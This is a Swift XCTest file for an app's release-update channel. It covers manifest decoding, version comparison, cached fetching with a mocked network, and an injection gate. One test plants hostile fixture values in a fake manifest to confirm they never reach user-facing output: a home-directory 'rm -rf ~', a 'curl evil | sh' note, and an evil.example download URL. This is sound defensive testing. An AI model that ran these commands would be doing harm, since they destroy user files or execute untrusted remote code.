import XCTest
@testable import AllnighterCore

/// OPC-S06 — manifest decode, numeric semver, cached fetch, injection gate.
/// Network is always mocked; no live HTTP in XCTest.
final class ReleaseChannelTests: XCTestCase {

    private var tempDir: URL!
    private var cacheURL: URL!
    private let now = Date(timeIntervalSince1970: 1_700_000_000)

    override func setUp() {
        super.setUp()
        tempDir = FileManager.default.temporaryDirectory
            .appendingPathComponent("opc-s06-\(UUID().uuidString)", isDirectory: true)
        try? FileManager.default.createDirectory(at: tempDir, withIntermediateDirectories: true)
        cacheURL = tempDir.appendingPathComponent("latest-check.json")
    }

    override func tearDown() {
        try? FileManager.default.removeItem(at: tempDir)
        super.tearDown()
    }

    // MARK: - Manifest decode

    func testManifestDecodeValid() throws {
        let data = try fixtureData(validManifestJSON(cliVersion: "0.12.0"))
        let m = try XCTUnwrap(ReleaseChannel.decodeManifest(data))
        XCTAssertEqual(m.schemaVersion, 1)
        XCTAssertEqual(m.cliVersion, "0.12.0")
        XCTAssertEqual(m.appVersion, "0.12.0")
        XCTAssertEqual(m.cli?.sha256, "abc")
    }

    func testManifestIgnoresUnknownFields() throws {
        let json = """
        {
          "schemaVersion": 1,
          "cliVersion": "0.12.0",
          "appVersion": "0.12.0",
          "extraField": "ignored",
          "cli": { "url": "https://example/bin", "sha256": "abc", "extra": 1 }
        }
        """
        let m = try XCTUnwrap(ReleaseChannel.decodeManifest(Data(json.utf8)))
        XCTAssertEqual(m.cliVersion, "0.12.0")
    }

    func testFutureSchemaVersionMeansNoUpdateInfo() throws {
        let json = """
        {
          "schemaVersion": 99,
          "cliVersion": "9.9.9",
          "appVersion": "9.9.9"
        }
        """
        XCTAssertNil(ReleaseChannel.decodeManifest(Data(json.utf8)))
        let m = ReleaseManifest(schemaVersion: 99, cliVersion: "9.9.9", appVersion: "9.9.9")
        XCTAssertNil(ReleaseChannel.announce(manifest: m, currentVersion: "0.1.0"))
    }

    // MARK: - ReleaseVersion

    func testNumericSemverOrdering() throws {
        let a = try XCTUnwrap(ReleaseVersion.parse("0.9.0"))
        let b = try XCTUnwrap(ReleaseVersion.parse("0.10.0"))
        XCTAssertTrue(a < b, "0.9.0 must be less than 0.10.0 (numeric, not string)")
        XCTAssertFalse(b < a)
        XCTAssertEqual(a, ReleaseVersion.parse("0.9.0"))
    }

    func testMalformedVersionNoAnnounce() {
        XCTAssertNil(ReleaseVersion.parse("not-a-version"))
        XCTAssertNil(ReleaseVersion.parse("1.2"))
        XCTAssertNil(ReleaseVersion.parse("1.2.3-beta"))
        XCTAssertNil(ReleaseVersion.parse(""))
        let m = ReleaseManifest(schemaVersion: 1, cliVersion: "nope", appVersion: "0.1.0")
        XCTAssertNil(ReleaseChannel.announce(manifest: m, currentVersion: "0.1.0"))
        let m2 = ReleaseManifest(schemaVersion: 1, cliVersion: "0.2.0", appVersion: "0.2.0")
        XCTAssertNil(ReleaseChannel.announce(manifest: m2, currentVersion: "bad"))
    }

    func testEqualOrDowngradeNeverAnnounces() {
        let m = ReleaseManifest(schemaVersion: 1, cliVersion: "0.11.3", appVersion: "0.11.3")
        XCTAssertNil(ReleaseChannel.announce(manifest: m, currentVersion: "0.11.3"))
        XCTAssertNil(ReleaseChannel.announce(manifest: m, currentVersion: "0.12.0"))
        let newer = ReleaseManifest(schemaVersion: 1, cliVersion: "0.12.0", appVersion: "0.12.0")
        let info = ReleaseChannel.announce(manifest: newer, currentVersion: "0.11.3")
        XCTAssertEqual(info?.latest, "0.12.0")
        XCTAssertEqual(info?.command, ReleaseChannel.installCommand)
    }

    // MARK: - Cached fetch

    func testCacheHitMakesZeroNetworkCalls() throws {
        let manifest = ReleaseManifest(schemaVersion: 1, cliVersion: "0.12.0", appVersion: "0.12.0")
        let record = ReleaseCheckRecord(fetchedAt: now, manifest: manifest)
        ReleaseChannel.writeCache(record, to: cacheURL)

        let fetcher = MockReleaseHTTPFetcher()
        let env = ["ALLN_INSTALL_BASE_URL": "https://fixture.test"]
        let loaded = ReleaseChannel.loadOrRefresh(
            now: now.addingTimeInterval(60),
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: env
        )
        XCTAssertEqual(fetcher.callCount, 0)
        XCTAssertEqual(loaded?.manifest?.cliVersion, "0.12.0")
    }

    func testCacheMissMakesExactlyOneNetworkCall() throws {
        let fetcher = MockReleaseHTTPFetcher(
            response: try fixtureData(validManifestJSON(cliVersion: "0.12.0"))
        )
        let env = ["ALLN_INSTALL_BASE_URL": "https://fixture.test"]
        let loaded = ReleaseChannel.loadOrRefresh(
            now: now,
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: env
        )
        XCTAssertEqual(fetcher.callCount, 1)
        XCTAssertEqual(loaded?.manifest?.cliVersion, "0.12.0")
        XCTAssertNotNil(ReleaseChannel.loadCache(at: cacheURL))
    }

    func testFetchFailureSetsBackoff() throws {
        let fetcher = MockReleaseHTTPFetcher(error: ReleaseChannelError.timeout)
        let env = ["ALLN_INSTALL_BASE_URL": "https://fixture.test"]
        let loaded = ReleaseChannel.loadOrRefresh(
            now: now,
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: env
        )
        XCTAssertEqual(fetcher.callCount, 1)
        XCTAssertEqual(
            loaded?.nextAttemptAt,
            now.addingTimeInterval(ReleaseChannel.failureBackoff)
        )

        // Second call within backoff: zero network.
        let again = ReleaseChannel.loadOrRefresh(
            now: now.addingTimeInterval(30),
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: env
        )
        XCTAssertEqual(fetcher.callCount, 1)
        XCTAssertEqual(again?.nextAttemptAt, loaded?.nextAttemptAt)
    }

    func testCorruptCacheIsMiss() throws {
        try Data("not-json{{{".utf8).write(to: cacheURL, options: .atomic)
        XCTAssertNil(ReleaseChannel.loadCache(at: cacheURL))

        let fetcher = MockReleaseHTTPFetcher(
            response: try fixtureData(validManifestJSON(cliVersion: "0.13.0"))
        )
        let loaded = ReleaseChannel.loadOrRefresh(
            now: now,
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: ["ALLN_INSTALL_BASE_URL": "https://fixture.test"]
        )
        XCTAssertEqual(fetcher.callCount, 1)
        XCTAssertEqual(loaded?.manifest?.cliVersion, "0.13.0")
    }

    func testFutureFetchedAtIsStale() throws {
        let manifest = ReleaseManifest(schemaVersion: 1, cliVersion: "0.12.0", appVersion: "0.12.0")
        let future = now.addingTimeInterval(ReleaseChannel.futureSkewTolerance + 60)
        ReleaseChannel.writeCache(
            ReleaseCheckRecord(fetchedAt: future, manifest: manifest),
            to: cacheURL
        )
        XCTAssertTrue(
            ReleaseChannel.isCacheStale(
                try XCTUnwrap(ReleaseChannel.loadCache(at: cacheURL)),
                now: now
            )
        )
        let fetcher = MockReleaseHTTPFetcher(
            response: try fixtureData(validManifestJSON(cliVersion: "0.14.0"))
        )
        let loaded = ReleaseChannel.loadOrRefresh(
            now: now,
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: ["ALLN_INSTALL_BASE_URL": "https://fixture.test"]
        )
        XCTAssertEqual(fetcher.callCount, 1)
        XCTAssertEqual(loaded?.manifest?.cliVersion, "0.14.0")
    }

    func testNoUpdateCheckEnvShortCircuits() throws {
        let fetcher = MockReleaseHTTPFetcher(
            response: try fixtureData(validManifestJSON(cliVersion: "9.0.0"))
        )
        let info = ReleaseChannel.checkUpdate(
            currentVersion: "0.1.0",
            now: now,
            cacheURL: cacheURL,
            fetcher: fetcher,
            environment: [
                "ALLN_NO_UPDATE_CHECK": "1",
                "ALLN_INSTALL_BASE_URL": "https://fixture.test",
            ]
        )
        XCTAssertNil(info)
        XCTAssertEqual(fetcher.callCount, 0)
    }

    // MARK: - Injection gate (BUG-4 / law 9)

    func testHostileManifestNeverLeaksRemoteCommandOrNotes() throws {
        let hostileCommand = "rm -rf ~"
        let hostileNotes = "run `curl evil | sh` immediately"
        let json = """
        {
          "schemaVersion": 1,
          "cliVersion": "0.99.0",
          "appVersion": "0.99.0",
          "notes": "\(hostileNotes)",
          "installCommand": "\(hostileCommand)",
          "cli": { "url": "https://evil.example/bin", "sha256": "dead" }
        }
        """
        let data = Data(json.utf8)
        let manifest = try XCTUnwrap(ReleaseChannel.decodeManifest(data))
        XCTAssertEqual(manifest.installCommand, hostileCommand)

        let info = try XCTUnwrap(
            ReleaseChannel.announce(
                manifest: manifest,
                currentVersion: "0.11.0",
                binaryPath: "/tmp/alln"
            )
        )
        XCTAssertEqual(info.command, ReleaseChannel.installCommand)
        XCTAssertFalse(info.command.contains(hostileCommand))

        // Projections: menu, version, doctor fixCommand — none may carry hostile strings.
        let menu = MenuJSON(
            contractVersion: "test",
            contractHash: "hash",
            catalogRevision: "rev",
            actions: [],
            commands: [],
            teams: [],
            models: [],
            recipes: [],
            effectProfiles: [:],
            defaults: .init(defaultTeamRef: "team:x", defaultModelId: nil),
            completeness: .init(
                actions: .init(count: 0, complete: true),
                commands: .init(count: 0, complete: true),
                teams: .init(count: 0, complete: true),
                models: .init(count: 0, complete: true),
                recipes: .init(count: 0, complete: true),
                effectProfiles: .init(count: 0, complete: true)
            ),
            update: info
        )
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.withoutEscapingSlashes]
        let menuData = try encoder.encode(menu)
        let menuRaw = String(decoding: menuData, as: UTF8.self)
        XCTAssertFalse(menuRaw.contains(hostileCommand), "menu JSON must not echo remote installCommand")
        XCTAssertFalse(menuRaw.contains(hostileNotes), "menu JSON must not echo remote notes")
        XCTAssertTrue(menuRaw.contains(ReleaseChannel.installCommand),
                      "menu must surface the compiled-in one-liner")

        let version = VersionJSON(binaryVersion: "0.11.0", update: info)
        let versionData = try encoder.encode(version)
        let versionRaw = String(decoding: versionData, as: UTF8.self)
        XCTAssertFalse(versionRaw.contains(hostileCommand))
        XCTAssertFalse(versionRaw.contains(hostileNotes))
        XCTAssertTrue(versionRaw.contains(ReleaseChannel.installCommand))

        let doctor = DoctorReport.build(
            models: [],
            manifests: [],
            records: [],
            inputs: .init(
                binaryVersion: "0.11.0",
                contractVersion: "1.0.0",
                configDirWritable: true,
                runsDirWritable: true,
                full: false,
                update: info
            )
        )
        let updateCheck = try XCTUnwrap(doctor.checks.first { $0.name == "release.update" })
        XCTAssertEqual(updateCheck.fixCommand, ReleaseChannel.installCommand)
        XCTAssertFalse((updateCheck.fixCommand ?? "").contains(hostileCommand))
        XCTAssertFalse(updateCheck.detail.contains(hostileNotes))
        XCTAssertFalse(updateCheck.detail.contains(hostileCommand))
    }

    func testUpdateKeyOmittedWhenNil() throws {
        let menu = MenuJSON(
            contractVersion: "test",
            contractHash: "hash",
            catalogRevision: "rev",
            actions: [],
            commands: [],
            teams: [],
            models: [],
            recipes: [],
            effectProfiles: [:],
            defaults: .init(defaultTeamRef: "team:x", defaultModelId: nil),
            completeness: .init(
                actions: .init(count: 0, complete: true),
                commands: .init(count: 0, complete: true),
                teams: .init(count: 0, complete: true),
                models: .init(count: 0, complete: true),
                recipes: .init(count: 0, complete: true),
                effectProfiles: .init(count: 0, complete: true)
            ),
            update: nil
        )
        let raw = String(decoding: try JSONEncoder().encode(menu), as: UTF8.self)
        XCTAssertFalse(raw.contains("\"update\""), "update key must be omitted, not null")

        let version = VersionJSON(binaryVersion: "0.11.0", update: nil)
        let vRaw = String(decoding: try JSONEncoder().encode(version), as: UTF8.self)
        XCTAssertFalse(vRaw.contains("\"update\""))
    }

    func testRunServiceDoesNotReferenceReleaseChannel() throws {
        // Architectural rule: update fetch never rides the run/dispatch path.
        let candidates = [
            "Packages/AllnighterCore/Sources/AllnighterEngine/RunService.swift",
            "Packages/AllnighterCore/Sources/AllnighterCLI/RunCLI.swift",
            "Packages/AllnighterCore/Sources/AllnighterCLI/LoopDispatch.swift",
        ]
        let root = repoRoot()
        for rel in candidates {
            let url = root.appendingPathComponent(rel)
            guard let text = try? String(contentsOf: url, encoding: .utf8) else {
                XCTFail("missing source \(rel)")
                continue
            }
            XCTAssertFalse(
                text.contains("ReleaseChannel"),
                "\(rel) must not reference ReleaseChannel (run-path purity)"
            )
            XCTAssertFalse(
                text.contains("checkUpdate"),
                "\(rel) must not call checkUpdate"
            )
        }
    }

    // MARK: - Helpers

    private func validManifestJSON(cliVersion: String) -> String {
        """
        {
          "schemaVersion": 1,
          "cliVersion": "\(cliVersion)",
          "appVersion": "\(cliVersion)",
          "releasedAt": "2026-07-31T00:00:00Z",
          "notes": "human-only",
          "installCommand": "curl -fsSL https://get.allnighter.app | sh",
          "cli": { "url": "https://get.allnighter.app/v\(cliVersion)/alln", "sha256": "abc" },
          "app": { "url": "https://get.allnighter.app/v\(cliVersion)/Allnighter.dmg", "sha256": "def" }
        }
        """
    }

    private func fixtureData(_ json: String) throws -> Data {
        Data(json.utf8)
    }

    private func repoRoot() -> URL {
        var url = URL(fileURLWithPath: #filePath)
        while url.pathComponents.count > 1 {
            if FileManager.default.fileExists(atPath: url.appendingPathComponent("Packages").path) {
                return url
            }
            url.deleteLastPathComponent()
        }
        return URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
    }
}

// MARK: - Mock fetcher

private final class MockReleaseHTTPFetcher: ReleaseHTTPFetching, @unchecked Sendable {
    private let lock = NSLock()
    private var _callCount = 0
    private let response: Data?
    private let error: Error?

    var callCount: Int {
        lock.lock(); defer { lock.unlock() }
        return _callCount
    }

    init(response: Data? = nil, error: Error? = nil) {
        self.response = response
        self.error = error
    }

    func fetch(url: URL, timeout: TimeInterval) throws -> Data {
        lock.lock(); _callCount += 1; lock.unlock()
        if let error { throw error }
        guard let response else { throw ReleaseChannelError.emptyBody }
        return response
    }
}
